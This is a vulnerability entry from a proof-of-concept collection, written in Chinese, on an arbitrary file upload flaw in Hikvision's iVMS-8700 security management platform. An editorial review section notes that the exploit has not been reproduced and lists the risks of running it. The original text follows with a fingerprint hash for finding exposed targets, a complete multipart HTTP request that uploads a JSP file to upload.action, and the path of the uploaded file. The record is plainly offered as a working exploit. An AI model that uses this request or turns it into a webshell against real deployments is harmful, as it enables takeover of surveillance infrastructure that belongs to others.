---
source: "Threekiii/Awesome-POC"
id: "vw-28e9a3d63ea8b6d43dab87cd"
entity_id: "ve-5d2a94ffb7e632b3ae391528"
schema_version: "1"
title: "Hikvision iVMS-8700综合安防管理平台 upload.action 任意文件上传漏洞"
product: "Hikvision iVMS-8700综合安防管理平台"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "重复ISMS会话Cookie/CAS用户名，软件版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/%E6%B5%B7%E5%BA%B7%E5%A8%81%E8%A7%86/HIKVISION%20iVMS-8700%E7%BB%BC%E5%90%88%E5%AE%89%E9%98%B2%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%20upload.action%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留；执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_status: "unknown"
canonical: "Web安全/智能设备/海康威视/HIKVISION-iVMS-8700综合安防管理平台-upload.action-任意文件上传漏洞.md"
relation_type: "duplicate_of"
---

# Hikvision iVMS-8700综合安防管理平台 upload.action 任意文件上传漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Hikvision iVMS-8700综合安防管理平台
- 本文讨论：eps/resourceOperations/upload.action JSP上传
- 版本、权限与配置前提：重复ISMS会话Cookie/CAS用户名，软件版本未知
- 资料类型：文件上传PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 不能据标题省略认证，携带两会话来源未解释
- 上传后随机文件名硬编码，路径提取仅截图；正文没有服务端根因/修复
- 与智能设备同入口完全重复，其他api上传动作须区分
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 文中写入/上传步骤会创建或覆盖目标文件；须先核对服务账户写权限、保存路径和脚本解析条件，验证后按原路径核查残留
- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 会话必要性、随机命名和JSP执行证据待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

Hikvision iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器

## 漏洞影响

Hikvision iVMS-8700综合安防管理平台

## 网络测绘

```
icon_hash="-911494769"
```

## 漏洞复现

登录页面

![image-20230704111156427](./.resource/HIKVISIONiVMS-8700综合安防管理平台upload.action任意文件上传漏洞/media/image-20230704111156427.png)

发送请求包上传文件

```http
POST /eps/resourceOperations/upload.action HTTP/1.1
Host: 
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: MicroMessenger
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ISMS_8700_Sessionname=CA0F207A6372FE883ACA78B74E6DC953; CAS-USERNAME=058; ISMS_8700_Sessionname=4D808BE7BE0E5C7047B9688E6009F710
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Length: 212

------WebKitFormBoundaryTJyhtTNqdMNLZLhj
Content-Disposition: form-data; name="fileUploader";filename="test.jsp"
Content-Type: image/jpeg

<%out.print("hello");%>
------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
```

上传路径

![image-20230704111213114](./.resource/HIKVISIONiVMS-8700综合安防管理平台upload.action任意文件上传漏洞/media/image-20230704111213114.png)

```
/eps/upload/769badc8ef5944da804a4ca3c8ecafb0.jsp
```

![image-20230704111225074](./.resource/HIKVISIONiVMS-8700综合安防管理平台upload.action任意文件上传漏洞/media/image-20230704111225074.png)


---

> 来源：Threekiii/Awesome-POC
